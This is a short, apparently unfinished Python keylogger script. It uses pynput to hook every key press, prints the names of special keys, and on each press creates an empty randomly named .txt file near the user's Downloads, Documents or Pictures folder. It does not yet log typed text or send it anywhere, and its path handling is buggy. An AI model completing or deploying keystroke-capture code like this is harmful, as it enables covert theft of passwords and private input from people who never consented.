from pynput.keyboard import Listener
import os
import random
from random import randrange
#log_file="C:\Users\Hassan Eissa\github\Keylogger"

def on_press(key):
    #print("PRESSED key"+str(key))

    keydict =	{
                  "Key.enter": "Enter",
                  "Key.backspace": "Backspace",
                  "Key.shift": "Shift",
                  "Key.ctrl_l":"CTRL",
                  "Key.print_screen": "PrintScreen",
                  "Key.alt_l":"ALT",
                  "\\x03":"CTRL-C",
                  "\\x13": "CTRL-S",
                  "\\x16": "CTRL-V",
                  "\\x17": "CTRL-W",
                  "Key.caps_lock":"CapsLock",
                  "Key.cmd":"WindowsKey",
                  "Key.space":"Space",
                  "Key.right":"RightArrow",
                  "Key.left":"LeftArrow",
                  "Key.up":"UpArrow",
                  "Key.down":"DownArrow",
                  "Key.delete":"Delete",
                  "Key.tab":"Tab"
                }
    if str(key) in keydict:
        print(key)


    #f = open("C:/Users\Hassan Eissa\Documents\myfile.txt", "x")
    UserPath=os.path.expanduser('~')
    FolderList=["\Downloads","\Documents","\Pictures"]
    FileFolder=random.choice(FolderList)
    print(FileFolder)
    FileName=randrange(100)
    FullPath=UserPath+FileFolder+str(FileName)+".txt"
    print(FullPath)
    file = open(FullPath, "x")
def on_release(rel):
    print("Released key"+str(rel))
    if str(rel) == 'Key.esc':
        print('Exiting...')
        exit()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
